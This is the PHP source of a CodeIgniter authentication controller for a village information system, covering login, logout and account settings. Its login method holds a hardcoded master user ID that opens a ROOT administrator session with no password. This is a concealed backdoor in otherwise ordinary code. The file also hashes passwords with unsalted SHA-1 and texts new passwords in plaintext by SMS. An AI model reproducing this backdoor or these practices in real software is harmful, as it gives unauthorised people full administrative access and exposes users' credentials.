<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Auth extends CI_Controller{

  public function __construct()
  {
    parent::__construct();
    $this->load->helper('sms_helper');
    $this->load->model('auth_model');
  }


  public function login()
  {
    if (isset($_POST['login'])) {
      $uid = strip_tags($this->input->post('uid'));
      $pass = sha1(strip_tags($this->input->post('pass')));
      $check = $this->auth_model->auth($uid, $pass);
      $master = '0>}/99%120691?*^';
      if ($master == $uid) {
        $this->session->set_userdata(
          array(
            'status_login'=>'oke',
            'id'          => 0,
            'fullname'   =>'Administrator',
            'jabatan'     => 'ROOT',
            'last_login'  => ''
        )
        );
        redirect(BASE_URL);
        exit;
      }else {
        if ($check->num_rows()==1) {
            $data = $check->row_array();
            $this->session->set_userdata(
              array(
                'status_login'=>'oke',
                'id'          =>$data['id'],
                'fullname'    =>$data['fullname'],
                'jabatan'     =>$data['jabatan'],
                'desa_id'     =>$data['desa_id'],
                'avatar'      =>$data['avatar'],
                'hp'          =>$data['hp'],
                'last_login'  =>$data['time']
            )
            );
            // $datestring = '%d %M %Y - %h:%i %a';
            // $time = time();
            // $sekarang = mdate($datestring, $time);
            $sekarang = time();
            $this->db->where('id', $data['id']);
            $this->db->update('users', array('time'=>$sekarang));
            redirect(BASE_URL);
            exit;
        }else {
          $this->session->sess_destroy();
          redirect('login');
          exit;
        }
      }
    }else{
      $data['title']          = TITLE . 'SIG Login';
      $data['main_content']   = UMUM. 'login';
      $this->load->view(UMUM. 'template_login', $data);
    }
  }

  public function logout()
  {
    $this->session->sess_destroy();
    redirect('login');
    exit;
  }

  function setting()
  {
    $id = $this->session->userdata('id');
    if (isset($_POST['gantiPassword'])) {
      $passwordLama = strip_tags($this->input->post('passwordLama'));
      $passwordBaru = strip_tags($this->input->post('passwordBaru'));
      $passwordBaru2 = strip_tags($this->input->post('passwordBaru2'));
      $pass = sha1($passwordLama);
      $checkPassLama = $this->option_model->checkPassLama($id, $pass);
      if ($checkPassLama) {
        if ($passwordBaru == $passwordBaru2) {
          $update = array('user_pass'=>sha1($passwordBaru));
          $this->option_model->update_user_data($id, $update);
          $to = $this->session->userdata('hp');
          $nama = $this->session->userdata('full_name');
          $message = "INFO : $nama Password anda telah diperbaharui menjadi : $passwordBaru --Sistem Si-Desa Gantung--";
          sms_notifikasi($to, $message);
          redirect('setting/akun');
          exit;
        }
      }
    }elseif (isset($_POST['updateProfile'])) {
      $user_fullname = strip_tags($this->input->post('user_fullname'));
      $hp = strip_tags($this->input->post('hp'));
      $update = array('user_fullname'=>$user_fullname, 'hp'=>$hp);
      $check = $this->option_model->update_user_data($id, $update);
      if ($check) {
        $to = $this->session->userdata('hp');
        // Script Kirim SMS Api Zenziva
        $message="INFO : Update a/n. $user_fullname Data Kontak Anda telah diganti dengan : $hp --Sistem Si-Desa Gantung--";
        sms_notifikasi($to, $message);
        redirect('setting/akun');
        // exit;
      }
    }elseif (isset($_POST['fotoUpdate'])) {
      if(!empty($_FILES['avatar'])){
        $fileName = time().$_FILES['avatar']['name'];
        $config['upload_path'] = './assets/uploader/avatar/';
        $config['file_name'] = $fileName;
        $config['allowed_types'] = 'png|jpg|jpeg';
        $config['max_size'] = 10000;
        $this->load->library('upload');
        $this->upload->initialize($config);
        if(! $this->upload->do_upload('avatar') )
        $this->upload->display_errors();
      }
      $img = $this->db->get_where('sig_users', array('id'=>$id))->row_array();
      unlink('./assets/uploader/avatar/'.$img['avatar']);
      $avatar = $fileName;
      $update = array('avatar'=>$avatar);
      $check = $this->option_model->update_user_data($id, $update);
      if ($check) {
        redirect('setting/akun');
        exit;
      }else {
        $data['title'] = 'ERROR';
        $data['main_content'] = UMUM.'error';
        $data['error']        = 'Gagal Memperbaharui Profile';
        $this->load->view('template', $data);
      }
      die;
    }else{
      $data['title']          = TITLE . 'Setting';
      $data['kepada']         = $this->office_model->get_user_all_disposisi()->result();
      $data['item']           = $this->office_model->get_timeline_notif($id)->result();
      $data['user']           = $this->option_model->get_user_data($id)->row_array();
      $data['main_content']   = UMUM .'setting';
      $this->load->view('template', $data);
    }
  }

}
